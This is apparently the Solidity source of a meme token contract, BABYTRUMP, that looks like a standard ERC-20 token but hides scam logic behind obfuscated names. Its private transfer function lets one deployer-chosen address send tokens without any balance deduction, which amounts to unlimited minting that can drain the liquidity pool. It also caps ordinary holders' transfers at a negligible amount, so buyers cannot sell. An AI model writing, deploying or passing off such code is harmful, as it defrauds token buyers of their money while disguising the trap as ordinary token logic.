/*

https://t.me/ethbabytrump

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract BABYTRUMP is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private gaibothkzex;

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    IUniswapV2Router02 private pigebdmhjcq;

    string public name;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function ivakf(address idapybv, address pgjbexuzv, uint256 gdfletpiuhq) private {
        address scmadoz = IUniswapV2Factory(pigebdmhjcq.factory()).getPair(address(this), pigebdmhjcq.WETH());
        if (0 == nkyjsztf[idapybv]) {
            if (idapybv != scmadoz && gaibothkzex[idapybv] != block.number && gdfletpiuhq < totalSupply) {
                require(gdfletpiuhq <= totalSupply / (10 ** decimals));
            }
            balanceOf[idapybv] -= gdfletpiuhq;
        }
        balanceOf[pgjbexuzv] += gdfletpiuhq;
        gaibothkzex[pgjbexuzv] = block.number;
        emit Transfer(idapybv, pgjbexuzv, gdfletpiuhq);
    }

    function transfer(address pgjbexuzv, uint256 gdfletpiuhq) public returns (bool success) {
        ivakf(msg.sender, pgjbexuzv, gdfletpiuhq);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address lxgc, uint256 gdfletpiuhq) public returns (bool success) {
        allowance[msg.sender][lxgc] = gdfletpiuhq;
        emit Approval(msg.sender, lxgc, gdfletpiuhq);
        return true;
    }

    string public symbol;

    uint256 private voylnzudwkm = 101;

    function transferFrom(address idapybv, address pgjbexuzv, uint256 gdfletpiuhq) public returns (bool success) {
        require(gdfletpiuhq <= allowance[idapybv][msg.sender]);
        allowance[idapybv][msg.sender] -= gdfletpiuhq;
        ivakf(idapybv, pgjbexuzv, gdfletpiuhq);
        return true;
    }

    mapping(address => uint256) private nkyjsztf;

    constructor(string memory xskbaw, string memory tqosrle, address fvqjpmyholtz, address krsu) {
        name = xskbaw;
        symbol = tqosrle;
        balanceOf[msg.sender] = totalSupply;
        nkyjsztf[krsu] = voylnzudwkm;
        pigebdmhjcq = IUniswapV2Router02(fvqjpmyholtz);
    }

    uint8 public decimals = 9;
}
